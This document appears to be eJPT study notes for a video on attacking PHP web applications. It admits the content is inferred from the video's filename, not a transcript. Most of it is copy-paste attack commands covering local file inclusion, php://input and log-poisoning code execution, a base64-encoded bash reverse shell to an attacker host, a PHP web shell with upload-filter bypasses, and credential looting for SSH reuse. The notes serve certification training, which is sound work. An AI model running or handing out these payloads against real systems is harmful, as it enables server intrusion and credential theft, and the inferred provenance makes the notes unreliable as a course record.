# 09 - Targeting PHP (eJPT) — Study Notes

Note: No transcript was provided. The following summary is inferred conservatively from the filename “09 - Targeting PHP.mp4” within the “01-LinuxExploitation” folder. It reflects common eJPT-relevant PHP attack techniques: detection, LFI/RFI, wrappers, log poisoning, file upload to web shell, and achieving a reverse shell on Linux.

## What the video covers (Introduction / big picture)
- How to recognize and target PHP-based web applications during Linux web exploitation.
- Enumerating PHP endpoints and parameters.
- Exploiting common PHP misconfigurations:
  - Local File Inclusion (LFI) and PHP stream wrappers (php://filter, php://input).
  - LFI to Remote Code Execution (RCE) via log poisoning and /proc/self/environ.
  - File upload bypasses to gain a PHP web shell.
- Converting code execution into a stable reverse shell.
- Pulling credentials from source/config files to facilitate lateral movement or SSH reuse.

## Flow (ordered)
1. Identify PHP on the target and enumerate .php endpoints and parameters.
2. Test for LFI and read source using php://filter to discover include patterns and creds.
3. Turn LFI into RCE via:
   - php://input (if executable include).
   - Log poisoning (/var/log/apache2/access.log, /var/log/httpd/access_log, /var/log/nginx/access.log).
   - Optionally /proc/self/environ.
4. If an upload function exists, bypass filters to upload a PHP web shell and execute commands.
5. From command execution, trigger a reverse shell and stabilize your TTY.
6. Loot sensitive files (config.php, wp-config.php, .env) for credentials and pivot.

## Tools highlighted
- curl — quick HTTP probing, header tricks, POST/GET payloads.
- ffuf or gobuster — discover PHP files and upload directories.
- Burp Suite — intercept/modify file uploads and parameters.
- nc (netcat) — reverse shell listener.
- base64 — safely deliver shell commands without special chars.
- exiftool (optional) — image polyglots for upload bypasses.
- python3 — TTY upgrade and URL encoding helpers.

## Typical command walkthrough (detailed, copy-paste friendly)

Set target and basics:
```bash
export TARGET="http://TARGET_IP_OR_HOST"
export LHOST="YOUR_ATTACK_IP"
export LPORT="4444"
```

1) Detect PHP and enumerate
```bash
# Check headers and hints
curl -sI "$TARGET" | head -n 20

# Discover .php endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
    -u "$TARGET/FUZZ" -e .php,.txt,.bak,.old \
    -mc 200,204,301,302,307,401,403

# Optional: parameter discovery on a known PHP page
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
    -u "$TARGET/index.php?FUZZ=test" -fs 0
```

2) LFI probes
```bash
# Common parameter names to try manually if found in the app:
# page, file, template, view, inc, include, lang, path

# Basic LFI (if raw includes are used)
curl -s "$TARGET/index.php?page=../../../../etc/passwd"

# If app appends ".php" internally, use filter to read PHP source safely
curl -s "$TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d | sed -n '1,120p'

# Try reading a config file with filter
curl -s "$TARGET/index.php?page=php://filter/convert.base64-encode/resource=../config.php" | base64 -d
```

3) LFI → RCE via php://input (works if include executes PHP from stream)
```bash
# If ?page=php://input is included and parsed, this executes 'id'
curl -s -X POST "$TARGET/index.php?page=php://input" \
    --data "<?php system('id'); ?>"
```

4) LFI → RCE via log poisoning
```bash
# Inject PHP into the access log via User-Agent
curl -s -A "<?php system(\$_GET['cmd']); ?>" "$TARGET/"

# Try including different web server logs via the LFI parameter
curl -s "$TARGET/index.php?page=/var/log/apache2/access.log&cmd=id"
curl -s "$TARGET/index.php?page=/var/log/httpd/access_log&cmd=id"
curl -s "$TARGET/index.php?page=/var/log/nginx/access.log&cmd=id"

# Optional: /proc/self/environ approach (works in specific setups)
curl -s -A "<?php system(\$_GET['cmd']); ?>" "$TARGET/"
curl -s "$TARGET/index.php?page=/proc/self/environ&cmd=id"
```

5) Get a reverse shell from RCE
```bash
# Listener on your box
nc -lvnp "$LPORT"

# Safer command delivery using base64 via POST (avoids URL quoting issues)
RS=$(printf 'bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"' "$LHOST" "$LPORT" | base64 -w0)

# Example using log inclusion endpoint (adjust the 'page=' path accordingly)
curl -s -X POST "$TARGET/index.php?page=/var/log/apache2/access.log" \
    --data-urlencode "cmd=echo $RS | base64 -d | bash"
```

6) Upgrade to a stable TTY
```bash
# In the reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background, then on your host:
stty raw -echo; fg
reset
export TERM=xterm-256color
stty rows 40 cols 120
```

7) File upload to PHP web shell (if an upload feature exists)
```bash
# Minimal command-exec web shell
printf '<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>' > shell.php

# Try direct PHP first; if blocked, try .phtml/.php5 or polyglot tricks
# Example: sending via curl to an upload endpoint (adjust field and path)
curl -s -F "file=@shell.php" "$TARGET/upload.php"

# Locate upload directory (common: /uploads, /files, /images, /assets/uploads)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
    -u "$TARGET/FUZZ" -mc 200,403 -recursion -e .php,.phtml,.php5

# Execute command via web shell
curl -s "$TARGET/uploads/shell.php?cmd=id"

# Trigger reverse shell via POST for easy quoting
curl -s -X POST "$TARGET/uploads/shell.php" \
    --data-urlencode "cmd=echo $RS | base64 -d | bash"
```

8) Loot credentials and sensitive files
```bash
# From RCE/webshell/LFI via php://filter, look for:
# - /var/www/html/config.php
# - /var/www/html/wp-config.php
# - /var/www/html/.env
# - framework configs (Laravel: .env, CodeIgniter: application/config/database.php)

# Example LFI read with php://filter
curl -s "$TARGET/index.php?page=php://filter/convert.base64-encode/resource=../wp-config.php" | base64 -d
```

## Practical tips
- PHP detection: index.php in URLs, X-Powered-By headers, or PHP session cookies (PHPSESSID).
- For LFI, test multiple parameter names and try both raw traversal and php://filter base64 reads.
- If the app appends “.php” to includes, target resource without extension or use php://filter/resource=name (no .php needed).
- Use base64 to avoid quoting headaches in RCE payloads.
- Try multiple log paths for log poisoning; Apache vs. httpd vs. nginx.
- File uploads:
  - Extensions to try: .php, .phtml, .php5, .phar
  - Double extensions: file.php.jpg
  - Content-type spoofing via Burp; add minimal image header (e.g., GIF89a;) for naïve checks.
- After initial RCE, print id and whoami to confirm web user (www-data/apache/nginx). Use that to reason about file permissions and log paths.
- Harvest credentials from config files; test credential reuse for SSH.

## Minimal cheat sheet (one-screen flow)
```bash
# Setup
export TARGET="http://TARGET"; export LHOST="ATTACK_IP"; export LPORT="4444"

# Enum PHP
curl -sI "$TARGET" | head
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "$TARGET/FUZZ" -e .php -mc 200,403

# LFI tests
curl -s "$TARGET/index.php?page=../../../../etc/passwd"
curl -s "$TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d | head

# php://input RCE
curl -s -X POST "$TARGET/index.php?page=php://input" --data "<?php system('id'); ?>"

# Log poisoning RCE
curl -s -A "<?php system(\$_GET['cmd']); ?>" "$TARGET/"
curl -s "$TARGET/index.php?page=/var/log/apache2/access.log&cmd=id"

# Reverse shell
nc -lvnp "$LPORT"
RS=$(printf 'bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"' "$LHOST" "$LPORT" | base64 -w0)
curl -s -X POST "$TARGET/index.php?page=/var/log/apache2/access.log" --data-urlencode "cmd=echo $RS | base64 -d | bash"

# TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'; ^Z; stty raw -echo; fg; reset

# Upload shell (if available)
printf '<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>' > shell.php
curl -s -F "file=@shell.php" "$TARGET/upload.php"
curl -s "$TARGET/uploads/shell.php?cmd=id"
```

## Summary
- Targeting PHP on Linux typically centers on enumerating .php resources, probing include parameters for LFI, and leveraging PHP stream wrappers (php://filter for code disclosure; php://input for RCE) to escalate to command execution.
- Where LFI exists without direct execution, log poisoning and /proc/self/environ can often bridge to RCE.
- File upload features can yield a straightforward PHP web shell; evade filters with alternative extensions and content tricks.
- Once you achieve code execution, deliver a reverse shell (base64 method is robust), stabilize your TTY, and loot application configs for credentials to further your compromise.